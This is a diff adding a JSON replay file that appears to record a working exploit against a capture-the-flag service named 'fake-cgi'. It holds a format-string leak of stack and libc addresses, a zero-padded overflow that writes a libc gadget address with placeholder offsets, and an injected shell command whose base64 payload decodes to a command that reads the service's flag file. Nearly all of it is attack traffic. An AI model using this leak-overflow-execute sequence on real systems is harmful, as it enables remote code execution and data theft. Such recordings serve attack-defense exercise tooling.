@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAAA0x{{{STACK_BASE:-18912:12:HEX:18:0x7ffde3be7620}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7f516b559780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7f516b28a2c0}}}:0x7f516b780700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7f516b284147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-Type: tex{{{HEAP_BASE:12148:3:ORI:41:0x682f74}}}tml;{{{HEAP_BASE:25376:3:ORI:48:0x686320}}}arset=UTF-8\\r\\nContent-Len{{{HEAP_BASE:29799:3:ORI:75:0x687467}}}: 23\\r\\nServer: EasyServer {{{HEAP_BASE:85032:3:ORI:103:0x694c28}}}nux)\\r\\n\\r{{{HEAP_BASE:15370:3:ORI:113:0x683c0a}}}3>Page Not Found{{{HEAP_BASE:12092:3:ORI:132:0x682f3c}}}3>", 
+    "0{{{HEAP_BASE:25445:3:ORI:0:0x686365}}}o \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnI{{{HEAP_BASE:96328:3:ORI:39:0x697848}}}YXNlNjQK\" |base64 -d {{{HEAP_BASE:29564:3:ORI:63:0x68737c}}}\\n"
+]
